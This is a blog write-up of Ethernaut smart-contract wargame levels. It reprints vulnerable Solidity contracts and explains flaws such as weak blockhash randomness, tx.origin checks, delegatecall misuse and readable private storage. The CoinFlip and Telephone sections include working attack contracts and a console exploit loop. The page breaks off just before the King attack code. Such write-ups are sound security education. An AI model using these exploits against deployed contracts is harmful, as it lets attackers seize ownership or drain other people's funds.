<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"2298233831.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Ethernaut ChallengesFallback1234567891011121314151617181920212223242526272829303132333435363738&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &amp;#123;    mapping(address &#x3D;&gt; u">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut Challenges">
<meta property="og:url" content="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/index.html">
<meta property="og:site_name" content="The Blog of Yu4n">
<meta property="og:description" content="Ethernaut ChallengesFallback1234567891011121314151617181920212223242526272829303132333435363738&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &amp;#123;    mapping(address &#x3D;&gt; u">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/%E6%88%AA%E5%B1%8F2025-09-14_16.46.06.png">
<meta property="og:image" content="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/%E6%88%AA%E5%B1%8F2025-09-14_16.46.23.png">
<meta property="og:image" content="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/swap_flow.png">
<meta property="og:image" content="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/uniswap_v2_swap_timeline.png">
<meta property="article:published_time" content="2025-10-14T15:45:28.000Z">
<meta property="article:modified_time" content="2025-10-14T16:00:28.883Z">
<meta property="article:author" content="Yu4n">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/%E6%88%AA%E5%B1%8F2025-09-14_16.46.06.png">

<link rel="canonical" href="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>Ethernaut Challenges | The Blog of Yu4n</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">The Blog of Yu4n</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-reverse">

    <a href="/categories/Reverse/" rel="section"><i class="fa fa-archive fa-fw"></i>Reverse</a>

  </li>
        <li class="menu-item menu-item-web3-security">

    <a href="/categories/Web3-Security/" rel="section"><i class="fa fa-shield-alt fa-fw"></i>Web3 Security</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Ethernaut Challenges
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-10-14 23:45:28" itemprop="dateCreated datePublished" datetime="2025-10-14T23:45:28+08:00">2025-10-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-15 00:00:28" itemprop="dateModified" datetime="2025-10-15T00:00:28+08:00">2025-10-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web3-Security/" itemprop="url" rel="index"><span itemprop="name">Web3 Security</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="Ethernaut-Challenges"><a href="#Ethernaut-Challenges" class="headerlink" title="Ethernaut Challenges"></a>Ethernaut Challenges</h1><h3 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here, we transfer money to it, trigger the receive of the target contract, set the owner to ourselves, and then call the withdraw function; here we can use its contribute function to transfer money directly. In solidity, the function used to transfer money is as follows:</p>
<table>
<thead>
<tr>
<th>method</th>
<th>example</th>
<th>Gas limitations</th>
<th>ret val</th>
<th>catch failure</th>
<th>recommend to use it ?</th>
</tr>
</thead>
<tbody><tr>
<td><code>.transfer(amount)</code></td>
<td><code>payableAddr.transfer(1 ether);</code></td>
<td>fixed 2300 gas</td>
<td>N&#x2F;A</td>
<td>auto <code>revert</code></td>
<td>❌</td>
</tr>
<tr>
<td><code>.send(amount)</code></td>
<td><code>bool ok = payableAddr.send(1 ether);</code></td>
<td>fixed 2300 gas</td>
<td><code>bool</code></td>
<td>need <code>require(ok)</code></td>
<td>❌</td>
</tr>
<tr>
<td><code>.call&#123;value: amount&#125;(&quot;&quot;)</code></td>
<td><code>(bool ok, ) = payableAddr.call&#123;value: 1 ether&#125;(&quot;&quot;); require(ok);</code></td>
<td>By default, all remaining gas can be transferred (can be specified manually)</td>
<td><code>(bool success, bytes data)</code></td>
<td>need check <code>success</code></td>
<td>✅</td>
</tr>
</tbody></table>
<h3 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The constructor name is wrong, causing it to be treated as a normal function by the compiler. The owner can be set to yourself by calling it directly.</p>
<h3 id="CoinFlip"><a href="#CoinFlip" class="headerlink" title="CoinFlip"></a>CoinFlip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This is because block.number is actually predictable. </p>
<p>The attack script is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">abstract contract CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) virtual public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    CoinFlip coinFlip = CoinFlip(0x63AF8FDEeb040B20dcdA1D5B8C8564Ad1112f88a);</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function exploit() public returns(bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 flip = blockValue / FACTOR;</span><br><span class="line">        bool side = flip == 1 ? true : false;</span><br><span class="line">        return coinFlip.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then deploy the contract to the test chain.</p>
<p>Then call it from the console.</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">exploitSimple</span>(<span class="params">times</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; times; i++) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> tx = <span class="keyword">await</span> attackContract.<span class="title function_">exploit</span>(&#123; <span class="attr">gasLimit</span>: <span class="number">300000</span> &#125;);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Call <span class="subst">$&#123;i+<span class="number">1</span>&#125;</span> sent:`</span>, tx.<span class="property">hash</span>);</span><br><span class="line">      <span class="keyword">await</span> tx.<span class="title function_">wait</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Call <span class="subst">$&#123;i+<span class="number">1</span>&#125;</span> confirmed`</span>);</span><br><span class="line">      <span class="comment">// Wait 1.5 seconds for a new block to be generated to prevent blockhash duplication</span></span><br><span class="line">      <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1500</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Call <span class="subst">$&#123;i+<span class="number">1</span>&#125;</span> failed:`</span>, e);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">exploitSimple</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It should be noted here that the caller of the intermediate process will be ignored, so this vulnerability can be used for indirect attack.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">abstract contract Telephone&#123;</span><br><span class="line">    function changeOwner(address _owner) virtual public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    //0xf30928a61F2cd6D39A1C9577c70e1C44395Bcb0c</span><br><span class="line">    Telephone telephone = Telephone(0xf30928a61F2cd6D39A1C9577c70e1C44395Bcb0c);</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        telephone.changeOwner(0xEOA_ADDR);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>uint integer overflow vulnerability, will basically no longer exist after 0.8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The delegate call vulnerability here is msg.data. You can change it to a function signature or function selector.</p>
<p>Then call the pwn function to change owner.</p>
<h3 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h3><p>How to transfer funds when the contract does not have receive and fallback? Use the selfdestruct function</p>
<h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>These variables are publicly available on-chain. Private variables can be accessed by getStorageAt(slot) on-chain. To protect data, encryption or off-chain storage is required.</p>
<p><strong>On-chain &#x3D;&#x3D; public</strong></p>
<h3 id="King"><a href="#King" class="headerlink" title="King"></a>King</h3><p>destination</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here, we want to refuse subsequent transactions after obtaining the owner. The attack contract is as follows：</p>
